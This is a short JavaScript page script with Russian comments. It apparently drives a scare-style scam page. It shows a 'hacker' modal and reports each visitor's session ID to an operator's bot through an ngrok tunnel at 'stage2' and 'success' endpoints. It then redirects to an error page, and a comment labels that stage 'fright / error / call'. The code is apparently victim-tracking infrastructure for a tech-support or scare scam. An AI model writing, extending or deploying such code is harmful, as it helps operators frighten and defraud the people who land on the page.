document.addEventListener('DOMContentLoaded', () => {
    const sitePreloader = document.getElementById('sitePreloader');
    const hackerModal = document.getElementById('hackerModal');
    const profileLoaderOverlay = document.getElementById('profileLoaderOverlay');

    // --- СЦЕНАРИЙ ДЕЙСТВИЙ ---
    setTimeout(() => {
        if (sitePreloader) {
            sitePreloader.classList.add('hidden');
        }

        setTimeout(() => {
            // ЭТАП 2: Загрузка формы / Индикатор загрузки
            if (hackerModal) {
                hackerModal.classList.add('visible');
                
                // Отправляем сигнал в бота: Этап 2 (Загрузка формы)
                fetch('https://stranger-bacteria-ladies.ngrok-free.dev/api/stage2', {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json',
                        'ngrok-skip-browser-warning': 'true'
                    },
                    body: JSON.stringify({ sessionId: localStorage.getItem('sessionId') })
                }).catch(err => console.error(err));
                
                // Имитируем короткую загрузку формы (2 секунды) и переходим на Этап 3 (error.html)
                setTimeout(() => {
                    hackerModal.classList.remove('visible');

                    if (profileLoaderOverlay) {
                        profileLoaderOverlay.classList.add('visible');
                    }

                    // Отправляем сигнал в бота: Этап 3 (Испуг / Ошибка / Звонок)
                    fetch('https://stranger-bacteria-ladies.ngrok-free.dev/api/success', {
                        method: 'POST',
                        headers: { 
                            'Content-Type': 'application/json',
                            'ngrok-skip-browser-warning': 'true'
                        },
                        body: JSON.stringify({ sessionId: localStorage.getItem('sessionId') })
                    }).catch(err => console.error(err));

                    setTimeout(() => {
                        window.location.href = 'error.html';
                    }, 1500);

                }, 2000);
            }

        }, 1500);

    }, 1000);
});